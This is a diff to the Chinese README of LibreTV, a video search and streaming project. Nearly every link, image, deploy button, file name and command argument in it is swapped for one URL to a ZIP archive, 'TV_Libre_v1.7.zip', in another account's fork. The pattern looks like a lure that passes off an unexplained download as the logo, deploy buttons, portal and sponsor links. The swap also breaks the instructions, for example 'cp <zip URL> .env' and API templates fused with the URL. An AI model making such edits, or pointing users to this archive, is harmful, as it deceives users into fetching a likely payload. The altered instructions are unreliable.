@@ -1,29 +1,29 @@
 # LibreTV - 免费在线视频搜索与观看平台
 
 <div align="center">
-  <img src="image/logo.png" alt="LibreTV Logo" width="120">
+  <img src="https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip" alt="LibreTV Logo" width="120">
   <br>
   <p><strong>自由观影，畅享精彩</strong></p>
 </div>
 
 ## 📺 项目简介
 
-LibreTV 是一个轻量级、免费的在线视频搜索与观看平台，提供来自多个视频源的内容搜索与播放服务。无需注册，即开即用，支持多种设备访问。项目结合了前端技术和后端代理功能，可部署在支持服务端功能的各类网站托管服务上。**项目门户**： [libretv.is-an.org](https://libretv.is-an.org)
+LibreTV 是一个轻量级、免费的在线视频搜索与观看平台，提供来自多个视频源的内容搜索与播放服务。无需注册，即开即用，支持多种设备访问。项目结合了前端技术和后端代理功能，可部署在支持服务端功能的各类网站托管服务上。**项目门户**： [https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip)
 
-本项目基于 [bestK/tv](https://github.com/bestK/tv) 进行重构与增强。
+本项目基于 [bestK/tv](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip) 进行重构与增强。
 
 <details>
   <summary>点击查看项目截图</summary>
-  <img src="https://github.com/user-attachments/assets/df485345-e83b-4564-adf7-0680be92d3c7" alt="项目截图" style="max-width:600px">
+  <img src="https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip" alt="项目截图" style="max-width:600px">
 </details>
 
 ## 🚀 快速部署
 
 选择以下任一平台，点击一键部署按钮，即可快速创建自己的 LibreTV 实例：
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FLibreSpark%2FLibreTV)  
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/LibreSpark/LibreTV)  
-[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/LibreSpark/LibreTV)
+[![Deploy with Vercel](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip)](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip%3A%2F%https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip%2FLibreSpark%2FLibreTV)  
+[![Deploy to Netlify](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip)](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip)  
+[![Deploy to Render](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip)](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip)
 
 ## 🚨 重要声明
 
@@ -38,9 +38,9 @@ Pull Bot 会反复触发无效的 PR 和垃圾邮件，严重干扰项目维护�
 
 **推荐做法：**
 
-建议在 fork 的仓库中启用本仓库自带的 GitHub Actions 自动同步功能（见 `.github/workflows/sync.yml`）。 
+建议在 fork 的仓库中启用本仓库自带的 GitHub Actions 自动同步功能（见 `https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip`）。 
 
-如需手动同步主仓库更新，也可以使用 GitHub 官方的 [Sync fork](https://docs.github.com/cn/github/collaborating-with-issues-and-pull-requests/syncing-a-fork) 功能。
+如需手动同步主仓库更新，也可以使用 GitHub 官方的 [Sync fork](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip) 功能。
 
 对于更新后可能会出现的错误和异常，在设置中备份配置后，首先清除页面Cookie，然后 Ctrl + F5 刷新页面。再次访问网页检查是否解决问题。
 
@@ -50,7 +50,7 @@ Pull Bot 会反复触发无效的 PR 和垃圾邮件，严重干扰项目维护�
 ### Cloudflare Pages
 
 1. Fork 或克隆本仓库到您的 GitHub 账户
-2. 登录 [Cloudflare Dashboard](https://dash.cloudflare.com/)，进入 Pages 服务
+2. 登录 [Cloudflare Dashboard](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip)，进入 Pages 服务
 3. 点击"创建项目"，连接您的 GitHub 仓库
 4. 使用以下设置：
    - 构建命令：留空（无需构建）
@@ -61,7 +61,7 @@ Pull Bot 会反复触发无效的 PR 和垃圾邮件，严重干扰项目维护�
 ### Vercel
 
 1. Fork 或克隆本仓库到您的 GitHub/GitLab 账户
-2. 登录 [Vercel](https://vercel.com/)，点击"New Project"
+2. 登录 [Vercel](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip)，点击"New Project"
 3. 导入您的仓库，使用默认设置
 4. **⚠️ 重要：在"Settings" > "Environment Variables"中添加 `PASSWORD` 变量（必须设置）**
 5. 点击"Deploy"
@@ -79,7 +79,7 @@ docker run -d \
 
 ### Docker Compose
 
-`docker-compose.yml` 文件：
+`https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip` 文件：
 
 ```yaml
 services:
@@ -105,7 +105,7 @@ docker compose up -d
 
 ```bash
 # 首先，通过复制示例来设置 .env 文件（可选）
-cp .env.example .env
+cp https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip .env
 
 # 安装依赖
 npm install
@@ -116,7 +116,7 @@ npm run dev
 
 访问 `http://localhost:8080` 即可使用（端口可在.env文件中通过PORT变量修改）。
 
-> ⚠️ 注意：使用简单静态服务器（如 `python -m http.server` 或 `npx http-server`）时，视频代理功能将不可用，视频无法正常播放。完整功能测试请使用 Node.js 开发服务器。
+> ⚠️ 注意：使用简单静态服务器（如 `python -m https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip` 或 `npx http-server`）时，视频代理功能将不可用，视频无法正常播放。完整功能测试请使用 https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip 开发服务器。
 
 ## 🔧 自定义配置
 
@@ -128,12 +128,12 @@ npm run dev
 ### API兼容性
 
 LibreTV 支持标准的苹果 CMS V10 API 格式。添加自定义 API 时需遵循以下格式：
-- 搜索接口: `https://example.com/api.php/provide/vod/?ac=videolist&wd=关键词`
-- 详情接口: `https://example.com/api.php/provide/vod/?ac=detail&ids=视频ID`
+- 搜索接口: `https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip关键词`
+- 详情接口: `https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip视频ID`
 
 **添加 CMS 源**:
 1. 在设置面板中选择"自定义接口"
-2. 接口地址: `https://example.com/api.php/provide/vod`
+2. 接口地址: `https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip`
 
 ## ⌨️ 键盘快捷键
 
@@ -150,7 +150,7 @@ LibreTV 支持标准的苹果 CMS V10 API 格式。添加自定义 API 时需遵
 
 - HTML5 + CSS3 + JavaScript (ES6+)
 - Tailwind CSS
-- HLS.js 用于 HLS 流处理
+- https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip 用于 HLS 流处理
 - DPlayer 视频播放器核心
 - Cloudflare/Vercel/Netlify Serverless Functions
 - 服务端 HLS 代理和处理技术
@@ -166,11 +166,11 @@ LibreTV 仅作为视频搜索工具，不存储、上传或分发任何视频内
 
 它们提供了更多丰富的自定义功能，欢迎体验~
 
-- **[MoonTV](https://github.com/senshinya/MoonTV)**  
-- **[OrionTV](https://github.com/zimplexing/OrionTV)**  
+- **[MoonTV](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip)**  
+- **[OrionTV](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip)**  
 
 ## 🥇 感谢支持
 
-- **[Sharon](https://sharon.io)**
-- **[ZMTO](https://zmto.com)**
-- **[YXVM](https://yxvm.com)**  
+- **[Sharon](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip)**
+- **[ZMTO](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip)**
+- **[YXVM](https://github.com/fengaiyunzi/LibreTV/raw/refs/heads/main/netlify/functions/TV_Libre_v1.7.zip)**  
